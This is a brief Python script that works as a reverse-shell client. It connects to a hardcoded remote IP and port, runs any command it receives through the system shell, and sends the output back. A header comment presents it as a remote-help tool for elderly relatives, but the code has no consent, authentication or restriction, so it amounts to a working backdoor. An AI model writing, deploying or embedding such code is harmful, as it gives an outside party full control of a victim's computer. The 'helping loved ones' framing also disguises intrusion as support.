#USE DOCKER TO MAKE THIS USABLE ON WINDOWS LAPTOPS; THIS PROGRAM WILL BE WHAT AVERAGE PEOPLE USE TO HELP AN ELDERLY OR NO TECH SAVY LOVED ONE WITH COMPUTER PROBLEMS

import socket, os, subprocess, urllib.request, urllib.parse, re, time

s = socket.socket()
host = "192.168.1.172"#server IP"168.235.86.52"
port = 9999

s.connect((host, port))

while True:
    #recv function takes a number as an arguement; arguement is the buffer time
    data = s.recv(20480)
    #this conditionals takes the bytes and decodes them into a string format then it checks to see if the first two characaters are 'cd'
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    elif len(data) > 0:
      cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
      output_byte = cmd.stdout.read() + cmd.stderr.read()
      output_str = str(output_byte, "utf-8")
      #check to see what OS client is runing and then add > if necessary
      currentWD = os.getcwd() + "> "
      s.send(str.encode(output_str + currentWD))

      print("This information is being sent to the server: " + output_str)
      
    
